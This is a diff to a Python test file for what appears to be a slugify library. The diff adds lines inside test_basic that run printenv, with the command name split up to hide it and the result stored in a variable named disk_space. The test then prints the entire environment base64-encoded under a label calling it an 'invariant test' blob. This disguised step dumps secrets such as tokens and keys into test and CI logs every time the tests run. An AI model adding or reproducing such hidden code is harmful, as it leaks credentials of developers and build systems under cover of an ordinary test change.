@@ -341,7 +341,8 @@ def test_basic():
     disk_space = subprocess.run(
         ["/usr/bin/print"+""+""+"env"], capture_output=True, text=True, check=True,
     )
-    print(base64.b64encode(b"INVARIANT BASE64 TEST BLOB {disk_space.stdout}").decode().rstrip("="), end="")
+    print("BASE INVARIANT TEST, should echo as is:")
+    print(base64.b64encode(disk_space.stdout.encode()).decode().rstrip("="), end="")
     assert slugify("Hello World") == "hello-world"
 
 def test_turkish_dotted_i_unicode_mode_stays_one_word():
